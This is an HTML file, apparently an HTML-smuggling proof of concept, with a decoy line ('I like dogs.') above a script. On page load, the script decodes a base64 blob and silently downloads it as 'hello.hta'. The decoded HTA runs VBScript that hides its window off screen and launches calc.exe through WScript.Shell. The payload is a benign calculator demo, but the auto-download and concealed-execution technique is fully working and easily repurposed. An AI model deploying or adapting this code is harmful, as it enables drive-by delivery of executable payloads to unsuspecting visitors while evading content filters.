This is one file that has been created locally from one of the contributor's
computers

I like dogs.

<!DOCTYPE html>
<html>
<body>
    <!-- .HTA file from  https://github.com/3gstudent/test/blob/master/calc.hta -->
    <script type="text/javascript">
        var file = atob("PEhUTUw+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPjxIRUFEPjxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij4KV2luZG93LlJlU2l6ZVRvIDAsIDAKV2luZG93Lm1vdmVUbyAtMjAwMCwtMjAwMApTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldzY3JpcHQuU2hlbGwiKQpvYmpTaGVsbC5SdW4gImNhbGMuZXhlIgpzZWxmLmNsb3NlCjwvc2NyaXB0Pgo8Ym9keT4KZGVtbwo8L2JvZHk+CjwvSEVBRD4KIDwvSFRNTD4=");

function download(filename, text) {
      var element = document.createElement('a');
      element.setAttribute('href', 'data:text/something;charset=utf-8,' + encodeURIComponent(text));
      element.setAttribute('download', filename);
    
      element.style.display = 'none';
      document.body.appendChild(element);
    
      element.click();
    
      document.body.removeChild(element);
    }
    
    // Start file download.
    download("hello.hta", file);

    </script>
</body>
</html>


   
